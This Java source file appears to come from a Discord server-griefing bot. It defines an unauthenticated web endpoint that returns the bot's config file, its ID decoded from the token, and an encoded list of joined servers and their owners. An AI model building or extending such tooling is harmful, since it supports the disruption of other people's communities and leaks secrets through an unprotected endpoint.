package de.corruptedbytes.webserver.webserverindexes.requests;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONObject;

import com.sun.net.httpserver.HttpServer;

import de.corruptedbytes.GriefBot;
import de.corruptedbytes.utils.Config;
import de.corruptedbytes.utils.FileUtils;
import de.corruptedbytes.webserver.WebServerIndex;
import de.corruptedbytes.webserver.WebServerUtil;
import net.dv8tion.jda.api.entities.Guild;

public class RequestInfo implements WebServerIndex {

	@Override
	public void index(HttpServer httpServer) throws IOException {
		httpServer.createContext("/requests/info", exchange -> {
			if (!exchange.getRequestMethod().equals("GET")) {
				exchange.close();
				return;
			}
			
			if (WebServerUtil.getQueryParam(exchange, "method") == null) {
				WebServerUtil.sendResponse(exchange, 200, ("ERROR").getBytes(StandardCharsets.UTF_8));
			}
			
			if (WebServerUtil.getQueryParam(exchange, "method").equalsIgnoreCase("config")) {
				WebServerUtil.sendResponse(exchange, 200, (FileUtils.readFile(Config.CONFIG_FILE)).getBytes(StandardCharsets.UTF_8));
			}
			
			if (WebServerUtil.getQueryParam(exchange, "method").equalsIgnoreCase("id")) {
				WebServerUtil.sendResponse(exchange, 200, (new String(Base64.getDecoder().decode(GriefBot.getInstance().getDiscordBotToken().split("\\.")[0]), StandardCharsets.UTF_8)).getBytes(StandardCharsets.UTF_8));
			}
			
			if (WebServerUtil.getQueryParam(exchange, "method").equalsIgnoreCase("guilds")) {
				if (GriefBot.getInstance().getGuilds() != null) {
					JSONObject jsonObject = new JSONObject();
					
					for (int i = 0; i < GriefBot.getInstance().getGuilds().size(); i++) {
						List<Guild> guild = GriefBot.getInstance().getGuilds();
						JSONArray jsonArray = new JSONArray();
						JSONObject item = new JSONObject();
						
						item.put("id", guild.get(i).getId());
						item.put("name", guild.get(i).getName());
						item.put("avatar", guild.get(i).getIconUrl());
						item.put("owner", guild.get(i).getOwner().getUser().getName());
						
						jsonArray.put(item);
						jsonObject.put(String.valueOf(i), jsonArray);
					}
					WebServerUtil.sendResponse(exchange, 200, (Base64.getEncoder().encodeToString(jsonObject.toString().getBytes(StandardCharsets.UTF_8))).getBytes(StandardCharsets.UTF_8));
				}
			}
		});
	}

}
